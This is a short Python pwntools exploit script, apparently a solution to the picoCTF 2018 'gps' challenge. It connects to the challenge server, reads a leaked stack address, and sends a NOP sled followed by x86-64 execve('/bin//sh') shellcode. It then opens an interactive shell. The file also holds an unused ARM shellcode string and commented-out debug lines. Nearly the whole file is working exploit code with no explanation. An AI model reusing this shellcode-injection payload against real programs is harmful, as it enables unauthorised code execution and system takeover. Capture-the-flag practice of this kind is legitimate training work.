from pwn import *

GDB_CMD = """
b *0x0000000000400aaa
"""

c = connect("2018shell1.picoctf.com", 21755)
#c = process("./gps")

#gdb.attach(c, GDB_CMD)

buf_len = 0x1000

shellcode = shellcraft.amd64.sh()
lsh = len(shellcode)

nop = shellcraft.amd64.nop()

print "len shell:", len(shellcode)
print "len nop:", len(nop)

#payload = nop * ((buf_len - lsh)//8) + shellcode
#payload = asm(shellcode)

sh = ("\x01\x30\x8f\xe2"+
                "\x13\xff\x2f\xe1"+
                "\x78\x46\x0e\x30"+
                "\x01\x90\x49\x1a"+
                "\x92\x1a\x08\x27"+
                "\xc2\x51\x03\x37"+
                "\x01\xdf\x2f\x62" +
                "\x69\x6e\x2f\x2f" +
                "\x73\x68")

sh = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"


payload = "\x90"*(buf_len - len(sh)-10)+sh

print c.recvuntil("Current position:")

address = c.recvline().strip()
print "+" + address + "+"

print c.recvrepeat(0.8)

print len(payload)

c.sendline(payload)
c.sendline(address)

c.interactive()
